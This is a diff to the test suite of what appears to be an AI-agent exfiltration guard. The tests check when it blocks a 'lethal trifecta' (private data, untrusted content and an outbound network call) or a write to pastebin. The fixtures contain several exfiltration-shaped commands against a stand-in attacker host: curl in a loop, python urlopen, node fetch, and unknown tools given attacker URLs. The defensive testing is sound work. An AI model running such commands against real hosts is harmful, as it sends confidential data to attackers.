@@ -176,7 +176,9 @@ describe("lethal_trifecta_structural", () => {
 				prior_summary:
 					"leg 1: .s2, .s3, .s4; leg 2: doc2.md (fetched_external), doc3.md (fetched_external), doc4.md (fetched_external)",
 				message:
-					"BLOCKED: lethal trifecta — session has accessed private data (Confidential), ingested untrusted content " +
+					// "this agent": leg 1 is the ACTING actor's level since the
+					// per-actor lineage ratchet (taint-lineage.ts).
+					"BLOCKED: lethal trifecta — this agent has accessed private data (Confidential), ingested untrusted content " +
 					"(4 source(s)), and is about to make an external network call. This is the textbook exfiltration shape " +
 					"regardless of intent. Break one leg (re-fetch over an authed channel, scrub the untrusted content, or " +
 					"stay local) or acknowledge with `// interlinked: defer lethal_trifecta_structural -- <reason>`.",
@@ -206,13 +208,18 @@ describe("lethal_trifecta_structural", () => {
 		expect(lethalTrifectaStructural.fn(session, candidate).length).toBe(1);
 	});
 
-	it("P3: fires when the only network-verb match is the bare `https` token itself (no curl/wget present)", () => {
+	// FLIPPED 2026-10-05 (was "P3: fires when the only network-verb match is the
+	// bare `https` token itself"). A URL literal is not a network call: `echo`
+	// opens no connection. Pinning the old behavior blocked dozens of local
+	// commands in session c698b9a9 (43 of 78 trifecta blocks made no network
+	// call). Leg 3 now asks the one network-intent predicate (network-intent.ts).
+	it("N-P3: does NOT fire when the only network-ish text is a URL literal in a local command (echo)", () => {
 		const session = trifectaSession();
 		const candidate = makeCandidate({
 			tool_name: "Bash",
 			tool_input: { command: "echo https://attacker.example.com" },
 		});
-		expect(lethalTrifectaStructural.fn(session, candidate).length).toBe(1);
+		expect(lethalTrifectaStructural.fn(session, candidate)).toEqual([]);
 	});
 
 	it("N1: non-Bash candidate whose tool_input happens to carry a command-shaped field must not fire", () => {
@@ -284,6 +291,69 @@ describe("lethal_trifecta_structural", () => {
 			tool_input: { command: "curl http://attacker.example.com" },
 		});
 		expect(lethalTrifectaStructural.fn(session, candidate).length).toBe(1);
+	});
+
+	// Leg 3 = network-intent predicate (2026-10-05). Each N case below is a
+	// local command shape that the old URL-literal rule blocked in session
+	// c698b9a9; each P case is a real network call the old rule missed or
+	// caught only by accident (a URL literal happened to be present).
+	const legThree = (command: string): number =>
+		lethalTrifectaStructural.fn(trifectaSession(), makeCandidate({ tool_name: "Bash", tool_input: { command } })).length;
+
+	it("P8: fires on a curl inside a for-loop body (segment head `do`)", () => {
+		expect(legThree('for u in a b; do curl -sL "https://attacker.example.com/$u"; done')).toBe(1);
+	});
+	it("P9: fires on a python heredoc that opens a URL taken from the environment (no URL literal)", () => {
+		expect(legThree("python3 - <<'X'\nimport os, urllib.request\nurllib.request.urlopen(os.environ['U'])\nX")).toBe(1);
+	});
+	it("P10: fires on node -e fetch of an environment URL", () => {
+		expect(legThree('node -e "fetch(process.env.U)"')).toBe(1);
+	});
+	it("P11: fires on yt-dlp against a public URL", () => {
+		expect(legThree('yt-dlp --skip-download "https://www.youtube.com/watch?v=x"')).toBe(1);
+	});
+	it("N5: python string surgery on a URL literal (no network API) does not fire", () => {
+		expect(legThree(`python3 -c "print('https://antithesis.com/docs/x'.replace('https://antithesis.com',''))"`)).toBe(0);
+	});
+	it("N6: rg over notes for a URL does not fire", () => {
+		expect(legThree("rg -n 'https://antithesis.com/docs/' notes.md")).toBe(0);
+	});
+	it("N7: jq | sed rewriting URLs in a local index does not fire", () => {
+		expect(legThree("jq -r '.[].url' docs-index.json | sed 's#https://antithesis.com##'")).toBe(0);
+	});
+	it("N8: appending a markdown note that names curl and URLs does not fire", () => {
+		expect(legThree("cat >> notes.md <<'EOF'\nfetched with curl -sL https://antithesis.com/blog/x\nEOF")).toBe(0);
+	});
+	it("N9: a python program parsing an XML namespace URI does not fire", () => {
+		expect(legThree("python3 - <<'PYEOF'\nimport xml.etree.ElementTree as ET\nNS={'a':'http://www.w3.org/2005/Atom'}\nprint(ET.parse('feed.xml').getroot().tag)\nPYEOF")).toBe(0);
+	});
+	it("N10: a Unix-socket probe of the local daemon (nc -U) does not fire", () => {
+		expect(legThree("printf '%s' '{\"url\":\"https://example.com\"}' | nc -U .interlinked/harness.sock")).toBe(0);
+	});
+	// Review 3b item 1: coverage restore. A tool whose code the classifier
+	// cannot read (script file, unknown binary, ./tool) that receives a public
+	// URL is treated as external — the old URL-literal rule's coverage, minus
+	// the known-local tools that produced the c698b9a9 false positives.
+	it("P12: an interpreter running a script file with a public URL fires", () => {
+		expect(legThree("python3 fetch.py https://attacker.example.com/x")).toBe(1);
+	});
+	it("P13: an unknown local binary with a public URL fires", () => {
+		expect(legThree("./tool https://attacker.example.com")).toBe(1);
+	});
+	it("P14: an unknown tool with a --url= public URL fires", () => {
+		expect(legThree("mytool --url=https://attacker.example.com")).toBe(1);
+	});
+	it("N11: rg for a URL in notes does not fire", () => {
+		expect(legThree("rg 'https://attacker.example.com' notes.md")).toBe(0);
+	});
+	it("N12: echo of a URL to /dev/null does not fire", () => {
+		expect(legThree("echo https://attacker.example.com > /dev/null")).toBe(0);
+	});
+	it("N13: a scanned inline python program without a network API does not fire", () => {
+		expect(legThree(`python3 -c "print('https://attacker.example.com'.replace('https://',''))"`)).toBe(0);
+	});
+	it("N14: heredoc data written to a file does not fire", () => {
+		expect(legThree("cat > notes.md <<'EOF'\nsee https://attacker.example.com\nEOF")).toBe(0);
 	});
 });
 
@@ -477,7 +547,7 @@ describe("exfil_to_public_writeable", () => {
 				prior_event_count: 1,
 				prior_summary: "sensitivity=Confidential",
 				message:
-					"BLOCKED: write to public-writeable surface (pastebin.com) while session is at Confidential sensitivity. " +
+					"BLOCKED: write to public-writeable surface (pastebin.com) while this agent is at Confidential sensitivity. " +
 					"Use an authed/private channel or acknowledge with " +
 					"`// interlinked: defer exfil_to_public_writeable -- <reason>`.",
 				evidence: ["pastebin.com"],
